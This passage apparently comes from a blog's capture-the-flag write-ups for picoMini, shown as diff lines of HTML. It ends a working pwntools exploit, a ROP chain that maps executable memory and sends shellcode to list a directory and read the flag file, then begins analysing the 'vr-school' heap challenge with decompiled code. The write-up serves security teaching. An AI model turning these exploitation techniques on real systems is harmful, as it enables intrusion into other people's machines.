+    libc_base </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">read_address </span><span style="color:#f29e74;">- </span><span style="color:#ccc9c2;">offset_read
+    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;leaked libc_base: &quot; </span><span style="color:#f29e74;">+ </span><span style="color:#f28779;">hex</span><span style="color:#ccc9c2;">(libc_base))
+
+
+    </span><span style="font-style:italic;color:#5c6773;"># libc lets us control rdx and rcx, so that gets us the first four args
+    # let&#39;s take advantage of our new argument control to mmap some executable memory
+    # we&#39;re not mapping a file so we don&#39;t really care much about the last two argument regs
+
+
+    </span><span style="color:#ccc9c2;">pop_rdx_r12 </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">libc_base </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x000000000011c371
+    </span><span style="color:#ccc9c2;">pop_rcx </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">libc_base </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x000000000009f822
+
+    </span><span style="color:#ccc9c2;">payload </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;A&quot; </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">24 </span><span style="font-style:italic;color:#5c6773;"># need padding bc our stack pivot gadget has three pops between pop rsp and ret
+    </span><span style="color:#ccc9c2;">payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(pop_rdi) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0x10000</span><span style="color:#ccc9c2;">)
+    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(pop_rsi_r15) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0x100000</span><span style="color:#ccc9c2;">) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">)
+    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(pop_rdx_r12) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">7</span><span style="color:#ccc9c2;">) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">) </span><span style="font-style:italic;color:#5c6773;"># PROT_READ | PROT_WRITE | PROT_EXEC
+    </span><span style="color:#ccc9c2;">payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(pop_rcx) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0x22</span><span style="color:#ccc9c2;">) </span><span style="font-style:italic;color:#5c6773;"># MAP_PRIVATE | MAP_ANONYMOUS
+    </span><span style="color:#ccc9c2;">payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(libc_base </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x00000000000c9ccf</span><span style="color:#ccc9c2;">) </span><span style="font-style:italic;color:#5c6773;"># xor r9d, r9d
+    </span><span style="color:#ccc9c2;">payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(libc_base </span><span style="color:#f29e74;">+ </span><span style="color:#ccc9c2;">offset_mmap)
+
+    </span><span style="font-style:italic;color:#5c6773;"># we now have rwx memorable at a predictable address
+    # lets read some shellcode onto it and then return
+
+    </span><span style="color:#ccc9c2;">payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(pop_rdi)  </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0x400ce0</span><span style="color:#ccc9c2;">) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(exe</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">symbols[</span><span style="color:#bae67e;">&#39;strlen&#39;</span><span style="color:#ccc9c2;">])
+    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(pop_rdi) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">)
+    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(pop_rsi_r15) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0x0000000000010000</span><span style="color:#ccc9c2;">) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">)
+    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(exe</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">symbols[</span><span style="color:#bae67e;">&#39;read&#39;</span><span style="color:#ccc9c2;">])
+    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0x10000</span><span style="color:#ccc9c2;">)
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">send</span><span style="color:#ccc9c2;">(payload)
+
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recv</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0x10000</span><span style="color:#ccc9c2;">) </span><span style="font-style:italic;color:#5c6773;"># clean stdout
+
+
+    # get files in directory
+    # don&#39;t really need to bother parsing it
+    # can just print the whole thing and regex the filename out
+    # lastly, read again so we can write shellcode with the filename
+
+    </span><span style="color:#ccc9c2;">payload </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;&quot;
+    </span><span style="color:#ccc9c2;">payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">asm</span><span style="color:#ccc9c2;">(shellcraft</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">open</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;/app/&quot;</span><span style="color:#ccc9c2;">))
+    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">asm</span><span style="color:#ccc9c2;">(shellcraft</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">amd64</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">linux</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">getdents64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">3</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0x100000</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0x1000</span><span style="color:#ccc9c2;">))
+    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">asm</span><span style="color:#ccc9c2;">(shellcraft</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">amd64</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">linux</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">write</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0x100000</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0x1000</span><span style="color:#ccc9c2;">))
+    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">asm</span><span style="color:#ccc9c2;">(shellcraft</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">amd64</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">linux</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">read</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0x10000</span><span style="color:#f29e74;">+</span><span style="color:#ffcc66;">0x1000</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0x1000</span><span style="color:#ccc9c2;">))
+    payload </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">payload</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">ljust</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0x1000</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\x90</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">send</span><span style="color:#ccc9c2;">(payload)
+
+    flag_filename </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">re</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;(flag.*txt)&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recv</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0x1000</span><span style="color:#ccc9c2;">))</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">)
+
+    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;leaked flag filename: &quot; </span><span style="color:#f29e74;">+ </span><span style="color:#ccc9c2;">flag_filename</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span style="color:#ccc9c2;">())
+
+    </span><span style="font-style:italic;color:#5c6773;"># lastly, just open/mmap/write the flag filename
+
+    </span><span style="color:#ccc9c2;">payload </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;&quot;
+    </span><span style="color:#ccc9c2;">payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">asm</span><span style="color:#ccc9c2;">(shellcraft</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">open</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;/app/</span><span style="color:#ccc9c2;">{flag_filename</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span style="color:#ccc9c2;">()}</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">))
+    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">asm</span><span style="color:#ccc9c2;">(shellcraft</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">amd64</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">linux</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">mmap</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0x20000</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x100</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">2</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">4</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">))
+    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">asm</span><span style="color:#ccc9c2;">(shellcraft</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">amd64</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">linux</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">write</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;rax&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0x100</span><span style="color:#ccc9c2;">))
+    
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">send</span><span style="color:#ccc9c2;">(payload)
+
+    </span><span style="font-style:italic;color:#5c6773;"># good luck pwning :)
+
+    </span><span style="color:#ccc9c2;">r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span style="color:#ccc9c2;">()
+
+
+</span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span style="color:#ccc9c2;">:
+    </span><span style="color:#ffd580;">main</span><span style="color:#ccc9c2;">()
+</span></code></pre><h1 id="vr-school">vr-school</h1>
+<pre style="background-color:#212733;">
+<code class="language-text" data-lang="text"><span style="color:#ccc9c2;">Join my online school! Don&#39;t get lost in the virtual functions..
+
+nc mars.picoctf.net 31638
+</span></code></pre>
+<p>I gotta say, big fan of getting Dockerfiles provided. It's quite nice to not need to worry if your exploit will run on remote because your testing environment is identical. </p>
+<p><a href="/ctf/picomini-by-redpwn/vr-school/chall">chall</a> 
+<a href="/ctf/picomini-by-redpwn/vr-school/Dockerfile">chall</a> 
+<a href="/ctf/picomini-by-redpwn/vr-school/chall.patch">chall.patch</a> (not provided, has stubbed alarm) </p>
+<h2 id="analysis-1">analysis</h2>
+<pre style="background-color:#212733;">
+<code class="language-text" data-lang="text"><span style="color:#ccc9c2;">[*] &#39;/home/sky/Dropbox/ctf/picomini-by-redpwn/vr-school/chall&#39;
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    RUNPATH:  b&#39;.&#39;
+</span></code></pre><pre style="background-color:#212733;">
+<code class="language-text" data-lang="text"><span style="color:#ccc9c2;">❯ ./chall
+                                                   /$$$$$$       /$$$$$$ 
+                                                   /$$__  $$     /$$$_  $$
+ /$$$$$$$$  /$$$$$$   /$$$$$$  /$$$$$$/$$$$       |__/  \ $$    | $$$$\ $$
+|____ /$$/ /$$__  $$ /$$__  $$| $$_  $$_  $$        /$$$$$$/    | $$ $$ $$
+   /$$$$/ | $$  \ $$| $$  \ $$| $$ \ $$ \ $$       /$$____/     | $$\ $$$$
+  /$$__/  | $$  | $$| $$  | $$| $$ | $$ | $$      | $$          | $$ \ $$$
+ /$$$$$$$$|  $$$$$$/|  $$$$$$/| $$ | $$ | $$      | $$$$$$$$ /$$|  $$$$$$/
+|________/ \______/  \______/ |__/ |__/ |__/      |________/|__/ \______/ 
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+0. Create a student
+1. Set student name
+2. Print student name
+3. &quot;Study&quot;
+4. Remote student
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+choice: 
+</span></code></pre>
+<p>Menu driven heap pwnable? (yes)</p>
+<pre style="background-color:#212733;">
+<code class="language-c" data-lang="c"><span style="color:#ffa759;">void </span><span style="color:#ffd580;">main</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">void</span><span style="color:#ccc9c2;">)
+
+{
+  student </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">psVar1</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ccc9c2;">  basic_ostream </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">pbVar2</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ccc9c2;">  basic_istream</span><span style="color:#f29e74;">&lt;</span><span style="color:#ffa759;">char</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">std:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">char_traits</span><span style="color:#f29e74;">&lt;</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">&gt;&gt; *</span><span style="color:#ccc9c2;">this</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ccc9c2;">  student </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">ppsVar3</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ccc9c2;">  student </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">puVar3</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#ffa759;">long</span><span style="color:#ccc9c2;"> in_FS_OFFSET</span><span style="color:#ccc9c2cc;">;
+  </span><span style="font-style:italic;color:#5ccfe6;">uint</span><span style="color:#ccc9c2;"> menu_select</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#ffa759;">int</span><span style="color:#ccc9c2;"> is_virtual</span><span style="color:#f29e74;">?</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ccc9c2;">  ulong student_index</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ccc9c2;">  undefined8 local_20</span><span style="color:#ccc9c2cc;">;
+  
+</span><span style="color:#ccc9c2;">  local_20 </span><span style="color:#f29e74;">= *</span><span style="color:#ccc9c2;">(undefined8 </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">)(in_FS_OFFSET </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#ffd580;">seccomp_setup</span><span style="color:#ccc9c2;">()</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ccc9c2;">  pbVar2 </span><span style="color:#f29e74;">=</span><span style="color:#ccc9c2;"> std:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">operator</span><span style="color:#f29e74;">&lt;&lt;</span><span style="color:#ccc9c2;">((basic_ostream </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">)std:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">cout</span><span style="color:#ccc9c2cc;">,
+</span><span style="color:#ccc9c2;">                           PTR_s__</span><span style="color:#f29e74;">/</span><span style="color:#ccc9c2;">$$$$$$_</span><span style="color:#f29e74;">/</span><span style="color:#ccc9c2;">$$$$$$_</span><span style="color:#f29e74;">/</span><span style="color:#ccc9c2;">$$___$$_</span><span style="color:#f29e74;">/</span><span style="color:#ccc9c2;">$$$__$_00303010)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ccc9c2;">  std:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">basic_ostream</span><span style="color:#f29e74;">&lt;</span><span style="color:#ffa759;">char</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">std:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">char_traits</span><span style="color:#f29e74;">&lt;</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">&gt;&gt;</span><span style="color:#ccc9c2;">:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">operator</span><span style="color:#f29e74;">&lt;&lt;
+            </span><span style="color:#ccc9c2;">((basic_ostream</span><span style="color:#f29e74;">&lt;</span><span style="color:#ffa759;">char</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">std:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">char_traits</span><span style="color:#f29e74;">&lt;</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">&gt;&gt; *</span><span style="color:#ccc9c2;">)pbVar2</span><span style="color:#ccc9c2cc;">,
+</span><span style="color:#ccc9c2;">             std:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">endl</span><span style="color:#f29e74;">&lt;</span><span style="color:#ffa759;">char</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">std:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">char_traits</span><span style="color:#f29e74;">&lt;</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">&gt;&gt;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#ffa759;">do </span><span style="color:#ccc9c2;">{
+    pbVar2 </span><span style="color:#f29e74;">=</span><span style="color:#ccc9c2;"> std:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">operator</span><span style="color:#f29e74;">&lt;&lt;</span><span style="color:#ccc9c2;">((basic_ostream </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">)std:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">cout</span><span style="color:#ccc9c2cc;">,
+</span><span style="color:#ccc9c2;">                             PTR_s_$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_00303018)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ccc9c2;">    std:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">basic_ostream</span><span style="color:#f29e74;">&lt;</span><span style="color:#ffa759;">char</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">std:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">char_traits</span><span style="color:#f29e74;">&lt;</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">&gt;&gt;</span><span style="color:#ccc9c2;">:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">operator</span><span style="color:#f29e74;">&lt;&lt;
+              </span><span style="color:#ccc9c2;">((basic_ostream</span><span style="color:#f29e74;">&lt;</span><span style="color:#ffa759;">char</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">std:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">char_traits</span><span style="color:#f29e74;">&lt;</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">&gt;&gt; *</span><span style="color:#ccc9c2;">)pbVar2</span><span style="color:#ccc9c2cc;">,
+</span><span style="color:#ccc9c2;">               std:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">endl</span><span style="color:#f29e74;">&lt;</span><span style="color:#ffa759;">char</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">std:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">char_traits</span><span style="color:#f29e74;">&lt;</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">&gt;&gt;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ccc9c2;">    this </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">(basic_istream</span><span style="color:#f29e74;">&lt;</span><span style="color:#ffa759;">char</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">std:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">char_traits</span><span style="color:#f29e74;">&lt;</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">&gt;&gt; *</span><span style="color:#ccc9c2;">)
+           std:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">basic_istream</span><span style="color:#f29e74;">&lt;</span><span style="color:#ffa759;">char</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">std:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">char_traits</span><span style="color:#f29e74;">&lt;</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">&gt;&gt;</span><span style="color:#ccc9c2;">:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">operator</span><span style="color:#f29e74;">&gt;&gt;
+                     </span><span style="color:#ccc9c2;">((basic_istream</span><span style="color:#f29e74;">&lt;</span><span style="color:#ffa759;">char</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">std:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">char_traits</span><span style="color:#f29e74;">&lt;</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">&gt;&gt; *</span><span style="color:#ccc9c2;">)std:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">cin</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">int </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">)</span><span style="color:#f29e74;">&amp;</span><span style="color:#ccc9c2;">menu_select)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ccc9c2;">    std:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">basic_istream</span><span style="color:#f29e74;">&lt;</span><span style="color:#ffa759;">char</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">std:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">char_traits</span><span style="color:#f29e74;">&lt;</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">&gt;&gt;</span><span style="color:#ccc9c2;">:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">operator</span><span style="color:#f29e74;">&gt;&gt;</span><span style="color:#ccc9c2;">(this</span><span style="color:#ccc9c2cc;">,</span><span style="color:#f29e74;">&amp;</span><span style="color:#ccc9c2;">student_index)</span><span style="color:#ccc9c2cc;">;
+    </span><span style="color:#ffd580;">cap_students_15</span><span style="color:#ccc9c2;">(student_index)</span><span style="color:#ccc9c2cc;">;
+    </span><span style="color:#ffa759;">switch</span><span style="color:#ccc9c2;">(menu_select) {
+    </span><span style="color:#ffa759;">case </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">:
+</span><span style="color:#ccc9c2;">      pbVar2 </span><span style="color:#f29e74;">=</span><span style="color:#ccc9c2;"> std:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">operator</span><span style="color:#f29e74;">&lt;&lt;</span><span style="color:#ccc9c2;">((basic_ostream </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">)std:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">cout</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;virtual (0/1)? &quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ccc9c2;">      std:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">basic_ostream</span><span style="color:#f29e74;">&lt;</span><span style="color:#ffa759;">char</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">std:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">char_traits</span><span style="color:#f29e74;">&lt;</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">&gt;&gt;</span><span style="color:#ccc9c2;">:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">operator</span><span style="color:#f29e74;">&lt;&lt;
+                </span><span style="color:#ccc9c2;">((basic_ostream</span><span style="color:#f29e74;">&lt;</span><span style="color:#ffa759;">char</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">std:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">char_traits</span><span style="color:#f29e74;">&lt;</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">&gt;&gt; *</span><span style="color:#ccc9c2;">)pbVar2</span><span style="color:#ccc9c2cc;">,
+</span><span style="color:#ccc9c2;">                 std:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">endl</span><span style="color:#f29e74;">&lt;</span><span style="color:#ffa759;">char</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">std:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">char_traits</span><span style="color:#f29e74;">&lt;</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">&gt;&gt;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ccc9c2;">      std:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">basic_istream</span><span style="color:#f29e74;">&lt;</span><span style="color:#ffa759;">char</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">std:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">char_traits</span><span style="color:#f29e74;">&lt;</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">&gt;&gt;</span><span style="color:#ccc9c2;">:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">operator</span><span style="color:#f29e74;">&gt;&gt;
+                </span><span style="color:#ccc9c2;">((basic_istream</span><span style="color:#f29e74;">&lt;</span><span style="color:#ffa759;">char</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">std:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">char_traits</span><span style="color:#f29e74;">&lt;</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">&gt;&gt; *</span><span style="color:#ccc9c2;">)std:</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">cin</span><span style="color:#ccc9c2cc;">,</span><span style="color:#f29e74;">&amp;</span><span style="color:#ccc9c2;">is_virtual</span><span style="color:#f29e74;">?</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+      </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">(is_virtual</span><span style="color:#f29e74;">? == </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">) {
